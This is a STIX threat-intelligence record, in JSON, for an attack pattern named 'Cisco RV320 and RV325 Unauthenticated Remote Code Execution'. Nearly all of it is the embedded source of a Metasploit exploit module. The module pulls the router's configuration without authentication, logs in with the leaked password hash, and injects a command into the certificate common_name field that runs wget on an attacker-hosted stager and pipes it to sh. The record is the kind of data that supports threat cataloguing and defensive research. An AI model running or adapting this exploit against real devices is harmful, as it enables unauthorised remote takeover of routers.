{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a692147-ec95-47e0-ae63-263879225b01",
    "created": "2024-08-14T17:00:06.924735Z",
    "modified": "2024-08-14T17:00:06.924739Z",
    "name": "\"Cisco RV320 and RV325 Unauthenticated Remote Code Execution\"",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cisco_rv32x_rce.rb",
            "external_id": "cisco_rv32x_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-002/-cisco-rv320-unauthenticated-configuration-export"
        },
        {
            "source_name": "reference",
            "url": "https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-004/-cisco-rv320-command-injection"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::CmdStager\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Cisco RV320 and RV325 Unauthenticated Remote Code Execution\",\n      'Description'    => %q{\n        This exploit module combines an information disclosure (CVE-2019-1653)\n        and a command injection vulnerability (CVE-2019-1652) together to gain\n        unauthenticated remote code execution on Cisco RV320 and RV325 small business\n        routers. Can be exploited via the WAN interface of the router. Either via HTTPS\n        on port 443 or HTTP on port 8007 on some older firmware versions.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n        'RedTeam Pentesting GmbH', # Discovery, Metasploit\n        'Philip Huppert',          # Discovery\n        'Benjamin Grap'            # Metasploit\n      ],\n      'References'     => [\n          [ 'CVE','2019-1653' ],\n          [ 'CVE','2019-1652' ],\n          [ 'EDB','46243' ],\n          [ 'BID','106728' ],\n          [ 'BID','106732' ],\n          [ 'URL', 'https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-002/-cisco-rv320-unauthenticated-configuration-export' ],\n          [ 'URL', 'https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-004/-cisco-rv320-command-injection' ]\n      ],\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n         [ 'LINUX MIPS64',\n          {\n           'Platform' => 'linux',\n           'Arch'     => ARCH_MIPS64\n          }\n         ]\n        ],\n      'Payload'        =>\n        {\n         'BadChars' => \"\"\n        },\n      'CmdStagerFlavor' => [ 'bourne' ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2018-09-09',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      Opt::RPORT(8007), # port of Cisco webinterface\n      OptString.new('URIPATH', [true, 'The path for the stager. Keep set to default! (We are limited to 50 chars for the initial command.)', '/']),\n      OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request', 15]),\n      OptBool.new('USE_SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false]) # Don't use 'SSL' option to prevent HttpServer from picking this up.\n    ])\n    deregister_options('SSL') # prevent SSL in HttpServer and resulting payload requests since the injected wget command will not work with '--no-check-certificate' option.\n    deregister_options('SSLCert') # not required since stager only uses HTTP.\n  end\n\n  def execute_command(cmd, opts = {})\n    # use generated payload, we don't have to do anything here\n  end\n\n  def autofilter\n    true\n  end\n\n  def on_request_uri(cli, req)\n    print_status(\"#{peer} - Payload request received: #{req.uri}\")\n    @cmdstager = generate_cmdstager().join(';')\n    send_response(cli, \"#{@cmdstager}\")\n  end\n\n  def primer\n    payload_url = get_uri\n    print_status(\"Downloading configuration from #{peer}\")\n    if(datastore['USE_SSL'])\n      print_status(\"Using SSL connection to router.\")\n    end\n    res = send_request_cgi({\n      'uri' => normalize_uri(\"cgi-bin\",\"config.exp\"),\n      'SSL' => datastore['USE_SSL']\n    })\n    unless res\n      vprint_error('Connection failed.')\n      return nil\n    end\n\n    unless res.code == 200\n      vprint_error('Could not download config. Aborting.')\n      return nil\n    end\n\n    print_status(\"Successfully downloaded config\")\n    username = res.body.match(/^USERNAME=([a-zA-Z]+)/)[1]\n    pass = res.body.match(/^PASSWD=(\\h+)/)[1]\n    authkey = \"1964300002\"\n    print_status(\"Got MD5-Hash: #{pass}\")\n    print_status(\"Loging in as user #{username} using password hash.\")\n    print_status(\"Using default auth_key #{authkey}\")\n    res2 = send_request_cgi({\n      'uri' => normalize_uri(\"cgi-bin\",\"userLogin.cgi\"),\n      'SSL' => datastore['USE_SSL'],\n      'method' => 'POST',\n      'data' => \"login=true&portalname=CommonPortal&password_expired=0&auth_key=#{authkey}&auth_server_pw=Y2lzY28%3D&submitStatus=0&pdStrength=1&username=#{username}&password=#{pass}&LanguageList=Deutsch&current_password=&new_password=&re_new_password=\"\n    })\n\n    unless res\n      vprint_error('Connection failed during login. Aborting.')\n      return nil\n    end\n\n    unless res.code == 200\n      vprint_error('Login failed with downloaded credentials. Aborting.')\n      return nil\n    end\n\n    #Extract authentication cookies\n    cookies = res2.get_cookies()\n    print_status(\"Successfully logged in as user #{username}.\")\n    print_status(\"Got cookies: #{cookies}\")\n    print_status(\"Sending payload. Staging via #{payload_url}.\")\n    #Build staging command\n    command_string = CGI::escape(\"'$(wget -q -O- #{payload_url}|sh)'\")\n    if(command_string.length <= 63)\n      print_status(\"Staging command length looks good. Sending exploit!\")\n    else\n      vprint_error(\"Warning: Staging command length probably too long. Trying anyway...\")\n    end\n\n    res3 = send_request_cgi({\n      'uri' => normalize_uri(\"certificate_handle2.htm\"),\n      'SSL' => datastore['USE_SSL'],\n      'method' => 'POST',\n      'cookie' => cookies,\n        'vars_get' => {\n         'type' => '4',\n        },\n        'vars_post' => {\n          'page' => 'self_generator.htm',\n                    'totalRules' => '1',\n                    'OpenVPNRules' => '30',\n                    'submitStatus' => '1',\n                    'log_ch' => '1',\n                    'type' => '4',\n                    'Country' => 'A',\n                    'state' => 'A',\n                    'locality' => 'A',\n                    'organization' => 'A',\n                    'organization_unit' => 'A',\n                    'email' => 'any@example.com',\n                    'KeySize' => '512',\n                    'KeyLength' => '1024',\n                    'valid_days' => '30',\n                    'SelectSubject_c' => '1',\n                    'SelectSubject_s' => '1'\n        },\n        'data' => \"common_name=#{command_string}\"\n    })\n    unless res3\n      vprint_error('Connection failed while sending command. Aborting.')\n      return nil\n    end\n\n    unless res3.code == 200\n      vprint_error('Sending command not successful.')\n      return nil\n    end\n    print_status(\"Sending payload timed out. Waiting for stager to connect...\")\n  end\n\n  def check\n    #Check if device is vulnerable by downloading the config\n    res = send_request_cgi({'uri'=>normalize_uri(\"cgi-bin\",\"config.exp\")})\n\n    unless res\n      vprint_error('Connection failed.')\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200\n      return CheckCode::Safe\n    end\n\n    unless res.body =~ /PASSWD/\n      return CheckCode::Detected\n    end\n\n    CheckCode::Vulnerable\n  end\n\n  def exploit\n    # Main function.\n    # Setting delay for the Stager.\n    Timeout.timeout(datastore['HTTPDELAY']) {super}\n  rescue Timeout::Error\n    print_status(\"Waiting for stager connection timed out. Try increasing the delay.\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-09-09",
    "x_mitre_platforms": [
        "linux'"
    ]
}